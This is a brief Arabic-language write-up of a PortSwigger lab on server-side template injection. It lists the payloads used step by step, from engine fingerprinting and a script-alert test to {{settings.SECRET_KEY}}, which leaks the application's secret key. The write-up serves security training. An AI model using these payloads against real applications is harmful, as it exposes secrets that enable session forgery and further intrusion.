# Lab : Server - Side template injection with information disclosure via user - supplied objects

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects

- الفكره من ال Lab ده اني اعرف نوعه واستغله علشان اعرف الsecret key

```bash
1. {{ 7 * 7 }} => عمانا test بيه طلع error بس عرفنا النوع بتاع الengine و الerror مش وحش ده اثبت ان المكان ده مصاب 

2. {{ '<script>alert(3)</script>' }} => اتنفزت 

3. ih0vr{{364|add:733}}d121r ==>  اشتغلت برضو 

4. {{ settings.SECRET_KEY }} ==>  secret key ده الحل النهائي الي طلع ال
```
